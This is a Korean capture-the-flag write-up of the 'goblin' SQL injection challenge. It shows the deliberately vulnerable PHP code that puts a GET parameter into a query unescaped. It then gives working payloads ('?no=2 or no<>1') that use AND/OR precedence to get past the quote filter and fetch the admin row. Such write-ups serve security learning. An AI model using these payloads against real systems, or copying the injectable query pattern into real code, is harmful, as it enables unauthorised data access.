# GOBLIN

## Problem
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

## Inspection
* ``if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~");``
	- [RegExr](https://regexr.com/)로 분석.
	- **`'`, `"`, `` ` ``가 걸러진다.**
	- `/i`는 대소문자 구분이 없다는 뜻이다.
* `select id from prob_goblin where id='guest' and no={$_GET[no]}`
	- 파라미터로 `no`가 넘겨진다.
* `if($result['id'] == 'admin') solve("goblin");`
	- 쿼리문의 결과의 `id`가 `admin`이어야 통과한다.
* `?no=1`를 날려보니 `Hello guest`가 뜬다.
* `no`가 주요키라면 오름차순으로 수가 증가할 것이므로, `no=2`가 `admin`일 것이다.

## Solution
* `AND`, `OR` 연산자 우선순위의 차이를 이용한다.
	- `?no=2 or no=2` -> `select id from prob_goblin where id='guest' and no=2 or no=2`로 잘 통과한다.
	- `?no=2 or no<>1` -> `select id from prob_goblin where id='guest' and no=2 or no<>1`로 잘 통과한다.
	- `X and Y or Z`에서 `X and Y`의 결과를 거짓이 나오게 만들고, `Z`의 결과가 참이 나오게 만들어야 한다.